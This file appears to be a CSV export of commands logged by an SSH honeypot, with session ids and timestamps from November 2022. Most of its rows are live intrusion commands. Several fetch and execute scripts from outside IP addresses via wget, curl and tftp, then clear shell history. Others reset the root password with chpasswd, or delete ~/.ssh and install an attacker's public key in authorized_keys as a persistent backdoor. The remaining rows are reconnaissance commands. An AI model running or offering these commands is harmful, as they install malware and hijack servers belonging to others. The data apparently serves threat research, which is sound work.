id,session,timestamp,realm,input
1,3c4cc4476254,2022-11-15T15:22:02.859197Z,,"#!/bin/sh; PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; wget http://23.235.171.196:88/112; curl -O http://23.235.171.196:88/112; chmod +x 112; ./112; rm -rf 123.sh; history -c; "
2,3c4cc4476254,2022-11-15T15:23:20.948593Z,,/bin/eyshcjdmzg
3,3c4cc4476254,2022-11-15T15:23:20.947688Z,,/bin/eyshcjdmzg
4,3c4cc4476254,2022-11-15T15:23:21.347155Z,,"ls -la /var/run/gcc.pid"
5,3f8e66641459,2022-11-15T15:25:46.947938Z,,ls
6,3f8e66641459,2022-11-15T15:25:51.366225Z,,"uname -a"
7,ac464d3773f4,2022-11-15T17:02:19.413443Z,,"yum install wget -y; apt install wget -y;dnf install wget; pacman -S wget; cd /tmp; wget http://109.206.241.34/x86.sh; curl -O http://109.206.241.34/x86.sh; chmod 777 x86.sh; sh x86.sh microsoft"
8,5415aea8ef8f,2022-11-15T17:03:43.229914Z,,"yum install wget -y; apt install wget -y;dnf install wget; pacman -S wget; cd /tmp; wget http://109.206.241.34/x86.sh; curl -O http://109.206.241.34/x86.sh; chmod 777 x86.sh; sh x86.sh microsoft"
9,ee7ea851988a,2022-11-15T17:05:22.613580Z,,"yum install wget -y; apt install wget -y;dnf install wget; pacman -S wget; cd /tmp; wget http://109.206.241.34/x86.sh; curl -O http://109.206.241.34/x86.sh; chmod 777 x86.sh; sh x86.sh microsoft"
10,d359f1efa03b,2022-11-15T17:06:34.534586Z,,"yum install wget -y; apt install wget -y;dnf install wget; pacman -S wget; cd /tmp; wget http://109.206.241.34/x86.sh; curl -O http://109.206.241.34/x86.sh; chmod 777 x86.sh; sh x86.sh microsoft"
11,09e367e357b8,2022-11-15T17:06:48.761435Z,,"yum install wget -y; apt install wget -y;dnf install wget; pacman -S wget; cd /tmp; wget http://109.206.241.34/x86.sh; curl -O http://109.206.241.34/x86.sh; chmod 777 x86.sh; sh x86.sh microsoft"
12,d17d2d9fd1a4,2022-11-15T17:07:31.412433Z,,"yum install wget -y; apt install wget -y;dnf install wget; pacman -S wget; cd /tmp; wget http://109.206.241.34/x86.sh; curl -O http://109.206.241.34/x86.sh; chmod 777 x86.sh; sh x86.sh microsoft"
13,868d48083c37,2022-11-15T17:07:45.441092Z,,"yum install wget -y; apt install wget -y;dnf install wget; pacman -S wget; cd /tmp; wget http://109.206.241.34/x86.sh; curl -O http://109.206.241.34/x86.sh; chmod 777 x86.sh; sh x86.sh microsoft"
14,de0366721819,2022-11-15T17:08:00.177423Z,,"yum install wget -y; apt install wget -y;dnf install wget; pacman -S wget; cd /tmp; wget http://109.206.241.34/x86.sh; curl -O http://109.206.241.34/x86.sh; chmod 777 x86.sh; sh x86.sh microsoft"
15,976c66a30f54,2022-11-15T17:08:58.958535Z,,"yum install wget -y; apt install wget -y;dnf install wget; pacman -S wget; cd /tmp; wget http://109.206.241.34/x86.sh; curl -O http://109.206.241.34/x86.sh; chmod 777 x86.sh; sh x86.sh microsoft"
16,9ee0a527a7aa,2022-11-15T17:09:13.484043Z,,"yum install wget -y; apt install wget -y;dnf install wget; pacman -S wget; cd /tmp; wget http://109.206.241.34/x86.sh; curl -O http://109.206.241.34/x86.sh; chmod 777 x86.sh; sh x86.sh microsoft"
17,c66f0b124cf1,2022-11-15T17:09:27.917955Z,,"yum install wget -y; apt install wget -y;dnf install wget; pacman -S wget; cd /tmp; wget http://109.206.241.34/x86.sh; curl -O http://109.206.241.34/x86.sh; chmod 777 x86.sh; sh x86.sh microsoft"
18,f6c8c1d62ab8,2022-11-15T17:10:25.386665Z,,"yum install wget -y; apt install wget -y;dnf install wget; pacman -S wget; cd /tmp; wget http://109.206.241.34/x86.sh; curl -O http://109.206.241.34/x86.sh; chmod 777 x86.sh; sh x86.sh microsoft"
19,f6ff08845dd5,2022-11-15T17:11:08.813974Z,,"yum install wget -y; apt install wget -y;dnf install wget; pacman -S wget; cd /tmp; wget http://109.206.241.34/x86.sh; curl -O http://109.206.241.34/x86.sh; chmod 777 x86.sh; sh x86.sh microsoft"
20,dfc7b1a1681c,2022-11-15T18:02:26.773962Z,,"yum install wget -y; apt install wget -y;dnf install wget; pacman -S wget; cd /tmp; wget http://109.206.241.34/x86.sh; curl -O http://109.206.241.34/x86.sh; chmod 777 x86.sh; sh x86.sh microsoft"
21,f09dce22653b,2022-11-15T18:03:49.548077Z,,"yum install wget -y; apt install wget -y;dnf install wget; pacman -S wget; cd /tmp; wget http://109.206.241.34/x86.sh; curl -O http://109.206.241.34/x86.sh; chmod 777 x86.sh; sh x86.sh microsoft"
22,7195cec865d5,2022-11-15T18:05:27.163559Z,,"yum install wget -y; apt install wget -y;dnf install wget; pacman -S wget; cd /tmp; wget http://109.206.241.34/x86.sh; curl -O http://109.206.241.34/x86.sh; chmod 777 x86.sh; sh x86.sh microsoft"
23,18449fd1ea5b,2022-11-15T18:06:38.112800Z,,"yum install wget -y; apt install wget -y;dnf install wget; pacman -S wget; cd /tmp; wget http://109.206.241.34/x86.sh; curl -O http://109.206.241.34/x86.sh; chmod 777 x86.sh; sh x86.sh microsoft"
24,e2f9a98de51d,2022-11-15T18:06:52.500177Z,,"yum install wget -y; apt install wget -y;dnf install wget; pacman -S wget; cd /tmp; wget http://109.206.241.34/x86.sh; curl -O http://109.206.241.34/x86.sh; chmod 777 x86.sh; sh x86.sh microsoft"
25,b110e0744487,2022-11-15T18:07:35.196808Z,,"yum install wget -y; apt install wget -y;dnf install wget; pacman -S wget; cd /tmp; wget http://109.206.241.34/x86.sh; curl -O http://109.206.241.34/x86.sh; chmod 777 x86.sh; sh x86.sh microsoft"
26,1017e7d4bd78,2022-11-15T18:07:49.130864Z,,"yum install wget -y; apt install wget -y;dnf install wget; pacman -S wget; cd /tmp; wget http://109.206.241.34/x86.sh; curl -O http://109.206.241.34/x86.sh; chmod 777 x86.sh; sh x86.sh microsoft"
27,7713f796fdc6,2022-11-15T18:08:03.481340Z,,"yum install wget -y; apt install wget -y;dnf install wget; pacman -S wget; cd /tmp; wget http://109.206.241.34/x86.sh; curl -O http://109.206.241.34/x86.sh; chmod 777 x86.sh; sh x86.sh microsoft"
28,5678164bcf93,2022-11-15T18:09:02.382669Z,,"yum install wget -y; apt install wget -y;dnf install wget; pacman -S wget; cd /tmp; wget http://109.206.241.34/x86.sh; curl -O http://109.206.241.34/x86.sh; chmod 777 x86.sh; sh x86.sh microsoft"
29,0158cdd73058,2022-11-15T18:09:16.972986Z,,"yum install wget -y; apt install wget -y;dnf install wget; pacman -S wget; cd /tmp; wget http://109.206.241.34/x86.sh; curl -O http://109.206.241.34/x86.sh; chmod 777 x86.sh; sh x86.sh microsoft"
30,f482debdb8bd,2022-11-15T18:09:31.995491Z,,"yum install wget -y; apt install wget -y;dnf install wget; pacman -S wget; cd /tmp; wget http://109.206.241.34/x86.sh; curl -O http://109.206.241.34/x86.sh; chmod 777 x86.sh; sh x86.sh microsoft"
31,dd771c2a3bbf,2022-11-15T18:10:30.193789Z,,"yum install wget -y; apt install wget -y;dnf install wget; pacman -S wget; cd /tmp; wget http://109.206.241.34/x86.sh; curl -O http://109.206.241.34/x86.sh; chmod 777 x86.sh; sh x86.sh microsoft"
32,0664cbbec901,2022-11-15T18:11:14.391547Z,,"yum install wget -y; apt install wget -y;dnf install wget; pacman -S wget; cd /tmp; wget http://109.206.241.34/x86.sh; curl -O http://109.206.241.34/x86.sh; chmod 777 x86.sh; sh x86.sh microsoft"
33,83dd9da0c86d,2022-11-15T18:12:27.395114Z,,"uname -a"
34,e35fefa666d6,2022-11-15T18:12:27.497077Z,,"uname -a"
35,0a3811b7102a,2022-11-15T18:12:27.535980Z,,"uname -a"
36,dbb347d2e56d,2022-11-15T18:12:27.649953Z,,"uname -a"
37,963e521ca3fa,2022-11-15T18:12:27.787918Z,,"uname -a"
38,1eff086170d5,2022-11-15T18:12:27.823265Z,,"uname -a"
39,5233e534b8a7,2022-11-15T18:12:27.991029Z,,"uname -a"
40,ca6cbf8011f7,2022-11-15T18:12:28.050807Z,,"uname -a"
41,02b8a29d1147,2022-11-15T18:12:28.361229Z,,"uname -a"
42,b9fac0551100,2022-11-15T18:12:28.387552Z,,"uname -a"
43,8ddb3e0f5dda,2022-11-15T18:12:28.513873Z,,"uname -a"
44,25431d8d9899,2022-11-15T19:10:12.159898Z,,"uname -a"
45,ef48c597b595,2022-11-15T19:10:12.183338Z,,"uname -a"
46,d12820d46c14,2022-11-15T19:10:12.254867Z,,"uname -a"
47,eabf0e48278e,2022-11-15T19:10:12.358832Z,,"uname -a"
48,739fc34af64d,2022-11-15T19:10:12.390372Z,,"uname -a"
49,a972efd83932,2022-11-15T19:10:13.142773Z,,"uname -a"
50,b3e9263791fd,2022-11-15T19:48:53.969939Z,,"yum install wget -y; apt install wget -y; cd /tmp; wget http://79.133.109.151/ssh.sh; curl -O http://79.133.109.151/ssh.sh; chmod 777 ssh.sh; sh ssh.sh; tftp 79.133.109.151 -c get ssh1.sh; chmod 777 ssh1.sh; sh ssh1.sh; tftp -r ssh2.sh -g 79.133.109.151; chmod 777 ssh2.sh; sh ssh2.sh; rm -rf ssh.sh ssh1.sh ssh2.sh"
51,ad34c816adc4,2022-11-15T19:50:17.379691Z,,"yum install wget -y; apt install wget -y; cd /tmp; wget http://79.133.109.151/ssh.sh; curl -O http://79.133.109.151/ssh.sh; chmod 777 ssh.sh; sh ssh.sh; tftp 79.133.109.151 -c get ssh1.sh; chmod 777 ssh1.sh; sh ssh1.sh; tftp -r ssh2.sh -g 79.133.109.151; chmod 777 ssh2.sh; sh ssh2.sh; rm -rf ssh.sh ssh1.sh ssh2.sh"
52,c74b96e49d7d,2022-11-15T20:48:41.392087Z,,"cat /proc/cpuinfo | grep name | wc -l"
53,c74b96e49d7d,2022-11-15T20:48:41.985913Z,,"echo ""root:3saZ9DU1VdK0""|chpasswd|bash"
54,c74b96e49d7d,2022-11-15T20:48:42.655334Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
55,c74b96e49d7d,2022-11-15T20:48:43.284733Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
56,c74b96e49d7d,2022-11-15T20:48:43.877411Z,,"which ls"
57,c74b96e49d7d,2022-11-15T20:48:43.876038Z,,"ls -lh $(which ls)"
58,c74b96e49d7d,2022-11-15T20:48:44.550066Z,,"crontab -l"
59,c74b96e49d7d,2022-11-15T20:48:45.144233Z,,w
60,c74b96e49d7d,2022-11-15T20:48:45.848908Z,,"uname -m"
61,c74b96e49d7d,2022-11-15T20:48:46.482638Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
62,c74b96e49d7d,2022-11-15T20:48:47.211342Z,,top
63,c74b96e49d7d,2022-11-15T20:48:47.883571Z,,uname
64,c74b96e49d7d,2022-11-15T20:48:48.472809Z,,"uname -a"
65,c74b96e49d7d,2022-11-15T20:48:49.137142Z,,"lscpu | grep Model"
66,c74b96e49d7d,2022-11-15T20:48:49.826122Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
67,8ff1537db115,2022-11-15T20:51:30.838812Z,,"cat /proc/cpuinfo | grep name | wc -l"
68,8ff1537db115,2022-11-15T20:51:31.522887Z,,"echo ""root:tJwniv6yDo09""|chpasswd|bash"
69,8ff1537db115,2022-11-15T20:51:32.566295Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
70,8ff1537db115,2022-11-15T20:51:33.157445Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
71,8ff1537db115,2022-11-15T20:51:33.828829Z,,"which ls"
72,8ff1537db115,2022-11-15T20:51:33.828169Z,,"ls -lh $(which ls)"
73,8ff1537db115,2022-11-15T20:51:34.419771Z,,"crontab -l"
74,8ff1537db115,2022-11-15T20:51:35.093954Z,,w
75,8ff1537db115,2022-11-15T20:51:35.728149Z,,"uname -m"
76,8ff1537db115,2022-11-15T20:51:36.325155Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
77,8ff1537db115,2022-11-15T20:51:37.011605Z,,top
78,8ff1537db115,2022-11-15T20:51:37.624945Z,,uname
79,8ff1537db115,2022-11-15T20:51:38.362192Z,,"uname -a"
80,8ff1537db115,2022-11-15T20:51:39.011551Z,,"lscpu | grep Model"
81,f47f212dc178,2022-11-15T20:51:39.236333Z,,"cat /proc/cpuinfo | grep name | wc -l"
82,f47f212dc178,2022-11-15T20:51:39.444267Z,,"echo ""root:w2ugfcK3cWKk""|chpasswd|bash"
83,f47f212dc178,2022-11-15T20:51:39.555129Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
84,f47f212dc178,2022-11-15T20:51:39.759060Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
85,f47f212dc178,2022-11-15T20:51:39.918642Z,,"which ls"
86,f47f212dc178,2022-11-15T20:51:39.917845Z,,"ls -lh $(which ls)"
87,f47f212dc178,2022-11-15T20:51:40.027945Z,,"crontab -l"
88,f47f212dc178,2022-11-15T20:51:40.224182Z,,w
89,f47f212dc178,2022-11-15T20:51:40.389161Z,,"uname -m"
90,f47f212dc178,2022-11-15T20:51:40.494321Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
91,f47f212dc178,2022-11-15T20:51:40.697243Z,,top
92,f47f212dc178,2022-11-15T20:51:40.803708Z,,uname
93,8ff1537db115,2022-11-15T20:51:40.887342Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
94,f47f212dc178,2022-11-15T20:51:41.005577Z,,"uname -a"
95,f47f212dc178,2022-11-15T20:51:41.110164Z,,"lscpu | grep Model"
96,f47f212dc178,2022-11-15T20:51:41.315085Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
97,4d519de1a40d,2022-11-15T20:53:35.285109Z,,"uname -a"
98,e2aa4fc2ecd1,2022-11-15T20:53:36.446428Z,,"uname -a"
99,5e9976d42d50,2022-11-15T20:53:40.799329Z,,"uname -a"
100,3ce9272b26e6,2022-11-15T20:53:40.828150Z,,"uname -a"
101,305bbed5a1c0,2022-11-15T20:53:45.480129Z,,"uname -a"
102,1fa6ae1279af,2022-11-15T20:53:53.625151Z,,"cat /proc/cpuinfo | grep name | wc -l"
103,1fa6ae1279af,2022-11-15T20:53:53.724423Z,,"echo ""root:33o9KYu6GOvY""|chpasswd|bash"
104,1fa6ae1279af,2022-11-15T20:53:53.900799Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
105,1fa6ae1279af,2022-11-15T20:53:54.005962Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
106,1fa6ae1279af,2022-11-15T20:53:54.181458Z,,"which ls"
107,1fa6ae1279af,2022-11-15T20:53:54.180621Z,,"ls -lh $(which ls)"
108,1fa6ae1279af,2022-11-15T20:53:54.322135Z,,"crontab -l"
109,1fa6ae1279af,2022-11-15T20:53:54.420639Z,,w
110,1fa6ae1279af,2022-11-15T20:53:54.592853Z,,"uname -m"
111,1fa6ae1279af,2022-11-15T20:53:54.693513Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
112,1fa6ae1279af,2022-11-15T20:53:54.878624Z,,top
113,1fa6ae1279af,2022-11-15T20:53:55.015951Z,,uname
114,1fa6ae1279af,2022-11-15T20:53:55.118102Z,,"uname -a"
115,1fa6ae1279af,2022-11-15T20:53:55.295629Z,,"lscpu | grep Model"
116,1fa6ae1279af,2022-11-15T20:53:55.443150Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
117,5199fe801419,2022-11-15T20:53:56.369882Z,,"uname -a"
118,59c1f740637e,2022-11-15T20:53:57.400378Z,,"uname -a"
119,627599500a8e,2022-11-15T20:56:09.113307Z,,"cat /proc/cpuinfo | grep name | wc -l"
120,627599500a8e,2022-11-15T20:56:09.309544Z,,"echo ""root:ghPZTSFA3lvM""|chpasswd|bash"
121,627599500a8e,2022-11-15T20:56:09.452636Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
122,627599500a8e,2022-11-15T20:56:09.551373Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
123,627599500a8e,2022-11-15T20:56:09.735751Z,,"which ls"
124,627599500a8e,2022-11-15T20:56:09.734957Z,,"ls -lh $(which ls)"
125,627599500a8e,2022-11-15T20:56:09.833919Z,,"crontab -l"
126,627599500a8e,2022-11-15T20:56:10.011700Z,,w
127,627599500a8e,2022-11-15T20:56:10.156503Z,,"uname -m"
128,627599500a8e,2022-11-15T20:56:10.254759Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
129,627599500a8e,2022-11-15T20:56:10.439018Z,,top
130,627599500a8e,2022-11-15T20:56:10.538301Z,,uname
131,627599500a8e,2022-11-15T20:56:10.719852Z,,"uname -a"
132,627599500a8e,2022-11-15T20:56:10.863506Z,,"lscpu | grep Model"
133,627599500a8e,2022-11-15T20:56:10.964897Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
134,ebe4c3fa057c,2022-11-15T20:58:33.545223Z,,"cat /proc/cpuinfo | grep name | wc -l"
135,ebe4c3fa057c,2022-11-15T20:58:34.613942Z,,"echo ""root:YbvAu6jsTURh""|chpasswd|bash"
136,ebe4c3fa057c,2022-11-15T20:58:35.203970Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
137,ebe4c3fa057c,2022-11-15T20:58:36.506172Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
138,ebe4c3fa057c,2022-11-15T20:58:37.097194Z,,"which ls"
139,ebe4c3fa057c,2022-11-15T20:58:37.096480Z,,"ls -lh $(which ls)"
140,ebe4c3fa057c,2022-11-15T20:58:37.766048Z,,"crontab -l"
141,ebe4c3fa057c,2022-11-15T20:58:38.722154Z,,w
142,ebe4c3fa057c,2022-11-15T20:58:39.394260Z,,"uname -m"
143,ebe4c3fa057c,2022-11-15T20:58:41.683501Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
144,ebe4c3fa057c,2022-11-15T20:58:42.283301Z,,top
145,ebe4c3fa057c,2022-11-15T20:58:42.976336Z,,uname
146,ebe4c3fa057c,2022-11-15T20:58:43.614963Z,,"uname -a"
147,ebe4c3fa057c,2022-11-15T20:58:44.212163Z,,"lscpu | grep Model"
148,ebe4c3fa057c,2022-11-15T20:58:46.512108Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
149,a0cbf8798de9,2022-11-15T21:00:02.772307Z,,"cat /proc/cpuinfo | grep name | wc -l"
150,a0cbf8798de9,2022-11-15T21:00:03.451503Z,,"echo ""root:I7MIIJX7MvlA""|chpasswd|bash"
151,a0cbf8798de9,2022-11-15T21:00:04.080803Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
152,a0cbf8798de9,2022-11-15T21:00:04.674569Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
153,a0cbf8798de9,2022-11-15T21:00:05.350656Z,,"which ls"
154,a0cbf8798de9,2022-11-15T21:00:05.349647Z,,"ls -lh $(which ls)"
155,a0cbf8798de9,2022-11-15T21:00:05.992711Z,,"crontab -l"
156,a0cbf8798de9,2022-11-15T21:00:06.595466Z,,w
157,a0cbf8798de9,2022-11-15T21:00:07.266816Z,,"uname -m"
158,a0cbf8798de9,2022-11-15T21:00:07.857700Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
159,a0cbf8798de9,2022-11-15T21:00:08.544674Z,,top
160,a0cbf8798de9,2022-11-15T21:00:09.216702Z,,uname
161,a0cbf8798de9,2022-11-15T21:00:10.094388Z,,"uname -a"
162,a0cbf8798de9,2022-11-15T21:00:10.784138Z,,"lscpu | grep Model"
163,a0cbf8798de9,2022-11-15T21:00:12.636223Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
164,53935b50e772,2022-11-15T21:00:52.732563Z,,"cat /proc/cpuinfo | grep name | wc -l"
165,53935b50e772,2022-11-15T21:00:52.887255Z,,"echo ""root:iJodEFKho2VS""|chpasswd|bash"
166,53935b50e772,2022-11-15T21:00:52.998015Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
167,53935b50e772,2022-11-15T21:00:53.190111Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
168,53935b50e772,2022-11-15T21:00:53.307338Z,,"which ls"
169,53935b50e772,2022-11-15T21:00:53.305695Z,,"ls -lh $(which ls)"
170,53935b50e772,2022-11-15T21:00:53.497667Z,,"crontab -l"
171,53935b50e772,2022-11-15T21:00:53.656077Z,,w
172,53935b50e772,2022-11-15T21:00:53.769038Z,,"uname -m"
173,53935b50e772,2022-11-15T21:00:53.957407Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
174,53935b50e772,2022-11-15T21:00:54.121204Z,,top
175,53935b50e772,2022-11-15T21:00:54.235685Z,,uname
176,53935b50e772,2022-11-15T21:00:54.427194Z,,"uname -a"
177,53935b50e772,2022-11-15T21:00:54.540086Z,,"lscpu | grep Model"
